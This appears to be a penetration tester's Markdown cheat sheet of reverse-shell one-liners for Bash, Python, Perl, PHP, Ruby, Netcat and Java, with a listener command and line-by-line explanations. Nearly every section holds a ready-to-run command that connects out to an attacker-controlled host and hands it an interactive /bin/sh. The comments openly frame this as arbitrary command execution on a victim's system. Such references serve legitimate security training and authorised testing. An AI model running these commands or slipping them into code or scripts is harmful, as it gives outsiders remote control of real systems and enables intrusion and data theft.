## TOC

- [TOC](#toc)
- [Bash](#bash)
- [Python](#python)
- [Perl](#perl)
- [PHP](#php)
- [Ruby](#ruby)
- [Netcat](#netcat)
- [Java](#java)

**Refs:**

- [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [https://hypothetical.me/post/reverse-shell-in-bash/](https://hypothetical.me/post/reverse-shell-in-bash/)
- [https://www.gnucitizen.org/blog/reverse-shell-with-bash/](https://www.gnucitizen.org/blog/reverse-shell-with-bash/)
- [https://github.com/Screetsec/TheFatRat](https://github.com/Screetsec/TheFatRat)

## Bash

````bash
# 1. Host machine
nc -lvnp 4444

# 2. Remote machine
## Method1
bash -i >& /dev/tcp/$IP/4444 0>&1
## Method2, conn.sh: more general
```
exec 5<>/dev/tcp/$IP/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
```
bash conn.sh
# This Bash script establishes a TCP connection to $IP on port $Port and associates 
# file descriptor 5 with both input and output of the connection. It then reads data from 
# the input of the socket, executes each line as a command, and redirects the output of 
# the command back to the output of the socket. The purpose of this script is to give remote
# command execution control to an attacker at $IP, who can execute arbitrary commands 
# on the victim's system using this control.

## Other shells (zsh, fish)
````

```bash
# Explain the details inside this command.
bash -i >& /dev/tcp/$IP/4444 0>&1
```

- first, Bash will check if special files `/dev/tcp/<host>/<port>` are supported by your OS and if they aren’t, it will emulate them by opening a TCP connection to `$IP:4444` for you
- it will also *reassign* all three standard streams (stdin, stdout, and stderr)  to the socket with this new connection, so all the output will go into, and input will be read from this socket
- then it will start a new interactive Bash session



## Python

Environment ok:

- [x] Linux/Python2.7
- [x] Kali/Python3.11.2

one-line rshell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

unfold one-line py script for easier comprehension:

```python
import socket,subprocess,os;
# create a socket obj that uses IPv4 address family (socket.AF_INET) and TCP protocol (socket.SOCK_STREAM) for communication.
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
# establish a TCP connection with a remote host.
# after this, the socket obj can be used to send and receive data.
s.connect(("10.0.0.1",1234));
# duplicate the file descriptor for the socket object onto the standard input, output, and error streams of the current process
# this allows the process to use the socket object for input and output instead of the standard streams
os.dup2(s.fileno(),0); # s.fileno() returns the integer file descriptor associated with the socket obj s.
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
# execute a shell command ("/bin/sh -i") with its standard input and output redirected to the socket object
# this allows the attacker to execute arbitrary commands on the victim's system through the established connection
p=subprocess.call(["/bin/sh","-i"]);
```



## Perl

one-line rshell:

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

more featureful and robust rshell-file: [perl-rshell.perl](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell)



## PHP

one-line rshell:

This code assumes that the TCP connection uses file descriptor 3; if does not work, try 4, 5, 6 ...

```php
php -r '$sock=fsockopen("10.134.188.54",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

more featureful and robust rshell-file: [php-rshell.php](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)



## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```



## Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```bash
nc -e /bin/sh 10.0.0.1 1234
```



## Java

Ref: [Java Reverse Shell](https://blog.spoock.com/2018/11/07/java-reverse-shell/)

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

